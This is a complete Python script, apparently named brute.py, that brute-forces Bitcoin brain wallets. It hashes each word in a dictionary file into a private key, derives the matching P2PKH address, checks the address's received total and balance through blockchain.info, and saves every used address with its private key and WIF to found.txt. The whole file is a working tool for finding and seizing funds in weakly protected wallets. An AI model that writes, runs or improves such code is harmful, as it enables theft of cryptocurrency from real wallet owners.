#!/usr/bin/env python3
# brute.py
# Minimal iSH-friendly scanner: only p2pkh, blockchain.info default,
# dictionary.txt -> found.txt, one-field-per-line output.

from __future__ import annotations
import io, sys, logging, time, binascii, hashlib, json, os, random
import requests

# crypto libs
try:
    import ecdsa
    import base58
except Exception as e:
    print("Missing dependencies. Install: pip3 install requests ecdsa base58")
    raise

# ------------------ Wallet (p2pkh only) ------------------
class Wallet:
    """
    Wallet(passphrase, is_private_key=False)
    - if is_private_key: accepts hex privkey or WIF
    - else: SHA256(passphrase) -> priv key
    Exposes:
      - private_key (hex)
      - wif
      - addresses dict: only 'p2pkh'
    """
    def __init__(self, passphrase, is_private_key=False):
        self.passphrase = passphrase
        self.is_private_key = bool(is_private_key)
        if self.is_private_key:
            if self._looks_like_hex(self.passphrase):
                self.private_key = self.passphrase.lower()
            else:
                self.private_key = self._wif_to_hex(self.passphrase)
        else:
            # derive from passphrase
            self.private_key = binascii.hexlify(hashlib.sha256(self.passphrase.encode('utf-8')).digest()).decode()
        self.wif = self._hex_to_wif(self.private_key)
        self.pubkey_compressed = self._priv_to_compressed_pubkey(self.private_key)
        self.addresses = {}
        self.addresses['p2pkh'] = self._p2pkh_from_pubkey(self.pubkey_compressed)

    def _looks_like_hex(self, s):
        try:
            int(s, 16)
            return len(s) in (64, 66)
        except Exception:
            return False

    def _hex_to_wif(self, priv_hex, compressed=True):
        b = binascii.unhexlify(priv_hex)
        payload = b'\x80' + b
        if compressed:
            payload += b'\x01'
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()

    def _wif_to_hex(self, wif):
        try:
            raw = base58.b58decode(wif)
            payload = raw[:-4]
            if len(payload) == 34 and payload[-1] == 0x01:
                key = payload[1:-1]
            else:
                key = payload[1:]
            return binascii.hexlify(key).decode()
        except Exception:
            return ""

    def _priv_to_compressed_pubkey(self, priv_hex):
        priv = binascii.unhexlify(priv_hex)
        sk = ecdsa.SigningKey.from_string(priv, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        px = vk.to_string()
        x = px[:32]; y = px[32:]
        prefix = b'\x02' if (y[-1] % 2 == 0) else b'\x03'
        return prefix + x

    def _hash160(self, data_bytes):
        return hashlib.new('ripemd160', hashlib.sha256(data_bytes).digest()).digest()

    def _p2pkh_from_pubkey(self, pubkey_bytes):
        rip = self._hash160(pubkey_bytes)
        pref = b'\x00' + rip
        checksum = hashlib.sha256(hashlib.sha256(pref).digest()).digest()[:4]
        return base58.b58encode(pref + checksum).decode()

    def __repr__(self):
        return "<Wallet priv=%s addr_p2pkh=%s>" % (self.private_key[:8], self.addresses.get('p2pkh'))


# ------------------ BaseBlockExplorer & concrete classes (unchanged) ------------------

class BaseBlockExplorer(object):
    def __init__(self):
        self.session = None
        self._base_url = None
        self._base_url_received = None
        self._base_url_balance = None
        self._received_suffix = ''
        self._balance_suffix = ''

    def open_session(self):
        logging.info("Opening new session")
        self.session = requests.Session()
        return

    def close_session(self):
        logging.debug("Closing session")
        if self.session:
            try:
                self.session.close()
            except Exception:
                pass
        self.session = None

    def _get(self, url, timeout=15):
        r = self.session.get(url, timeout=timeout)
        r.raise_for_status()
        return r

    def _parse_numeric_from_response(self, response):
        text = response.text.strip()
        try:
            return float(text)
        except Exception:
            pass
        try:
            j = response.json()
            for key in ("total_received", "totalReceived", "final_balance", "finalBalance", "balance", "received"):
                v = None
                if isinstance(j, dict):
                    v = j.get(key)
                if v is not None:
                    return float(v)
            if isinstance(j, dict) and "data" in j:
                try:
                    inner = next(iter(j["data"].values()))
                    if isinstance(inner, dict):
                        addr = inner.get("address", {})
                        for k in ("received", "balance"):
                            if k in addr:
                                return float(addr.get(k))
                except Exception:
                    pass
        except Exception:
            pass
        raise Exception("Unable to parse numeric from response: " + text[:200])

    def get_received(self, public_address):
        if not self.session:
            raise Exception("open_session first")
        url = "{}/{}{}".format(self._base_url_received, public_address, self._received_suffix)
        r = self._get(url)
        num = self._parse_numeric_from_response(r)
        return num

    def get_balance(self, public_address):
        if not self.session:
            raise Exception("open_session first")
        url = "{}/{}{}".format(self._base_url_balance, public_address, self._balance_suffix)
        r = self._get(url)
        num = self._parse_numeric_from_response(r)
        return num

    @staticmethod
    def satoshi_to_btc(value):
        try:
            return float(value) / 100000000.0
        except Exception:
            raise

class BlockchainInfo(BaseBlockExplorer):
    STRING_TYPE = "blockchaininfo"
    def __init__(self):
        super().__init__()
        self._api_limit_seconds = 1
        logging.info("Note: sleeping %s seconds before blockchain.info calls to avoid rate limits", self._api_limit_seconds)
        self._base_url = "https://blockchain.info"
        self._base_url_received = "{}/q/getreceivedbyaddress".format(self._base_url)
        self._base_url_balance = "{}/q/addressbalance".format(self._base_url)

    def get_received(self, public_address):
        time.sleep(self._api_limit_seconds)
        val = super().get_received(public_address)
        return self.satoshi_to_btc(val)

    def get_balance(self, public_address):
        time.sleep(self._api_limit_seconds)
        val = super().get_balance(public_address)
        return self.satoshi_to_btc(val)


# ------------------ Main scanning (hard-coded defaults, p2pkh only) ------------------

def main():
    # Hard-coded defaults as requested
    dict_path = 'dictionary.txt'
    out_path = 'found.txt'
    use_private_key_lines = False  # lines are treated as passphrases -> SHA256 -> privkey
    sleep_between_success = 0.06

    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s %(levelname)-6s line %(lineno)-4s %(message)s')

    explorer = BlockchainInfo()
    explorer.open_session()

    # Validate dict file
    try:
        with io.open(dict_path, 'rt', encoding='utf-8') as f:
            f.read(4096)
    except Exception as e:
        logging.error("Failed to open dict file %s : %s", dict_path, e)
        sys.exit(1)
    f_dictionary = io.open(dict_path, 'rt', encoding='utf-8')

    # Prepare output
    try:
        fout = open(out_path, 'w', encoding='utf-8')
    except Exception as e:
        logging.error("Failed to open output file %s : %s", out_path, e)
        sys.exit(1)

    # For each word, only generate p2pkh and check received/balance
    for raw in f_dictionary:
        word = raw.rstrip('\n').rstrip('\r')
        if not word:
            continue
        logging.debug("processing: %s", word)
        try:
            wallet = Wallet(word, is_private_key=use_private_key_lines)
        except Exception as e:
            logging.warning("Failed to create wallet for '%s': %s", word, e)
            continue

        atype = 'p2pkh'
        addr = wallet.addresses.get(atype)
        if not addr:
            logging.debug("no p2pkh for %s", word)
            continue

        # get received with retries/backoff
        retry = 0
        max_retries = 4
        backoff = 1.0
        received = 0.0
        while retry < max_retries:
            try:
                received_raw = explorer.get_received(addr)
                if received_raw > 1000000000:
                    received = float(received_raw) / 1e8
                elif received_raw > 1 and received_raw < 1000000000:
                    if float(received_raw).is_integer():
                        received = float(received_raw) / 1e8
                    else:
                        received = float(received_raw)
                else:
                    received = float(received_raw)
                break
            except Exception as e:
                retry += 1
                sleep_time = backoff * (2 ** (retry-1)) * (0.5 + random.random())
                logging.warning("Error fetching received for %s (%s): %s — retry %d/%d sleeping %.2fs",
                                addr, atype, e, retry, max_retries, sleep_time)
                time.sleep(sleep_time)
        if retry == max_retries:
            logging.error("Giving up fetching received for %s (%s)", addr, atype)
            continue

        if received == 0:
            logging.debug("no received for %s (%s)", addr, atype)
            time.sleep(sleep_between_success)
            continue

        # get balance
        retry = 0
        balance = 0.0
        while retry < max_retries:
            try:
                balance_raw = explorer.get_balance(addr)
                if balance_raw > 1000000000:
                    balance = float(balance_raw) / 1e8
                elif balance_raw > 1 and balance_raw < 1000000000:
                    if float(balance_raw).is_integer():
                        balance = float(balance_raw) / 1e8
                    else:
                        balance = float(balance_raw)
                else:
                    balance = float(balance_raw)
                break
            except Exception as e:
                retry += 1
                sleep_time = backoff * (2 ** (retry-1)) * (0.5 + random.random())
                logging.warning("Error fetching balance for %s (%s): %s — retry %d/%d sleeping %.2fs",
                                addr, atype, e, retry, max_retries, sleep_time)
                time.sleep(sleep_time)
        if retry == max_retries:
            logging.error("Giving up fetching balance for %s (%s)", addr, atype)
            continue

        # write output as one field per line (7 lines) + blank line
        try:
            fout.write(str(word) + '\n')
            fout.write(str(atype) + '\n')
            fout.write(str(addr) + '\n')
            fout.write("{:.8f}".format(received) + '\n')
            fout.write(str(wallet.private_key) + '\n')
            fout.write(str(wallet.wif) + '\n')
            fout.write("{:.8f}".format(balance) + '\n')
            fout.write('\n')
            fout.flush()
            logging.info("Found used wallet for word '%s' addr %s", word, addr)
        except Exception as e:
            logging.error("Failed writing output for %s: %s", word, e)

        time.sleep(sleep_between_success)

    explorer.close_session()
    fout.close()
    f_dictionary.close()
    logging.info("Done.")

if __name__ == '__main__':
    main()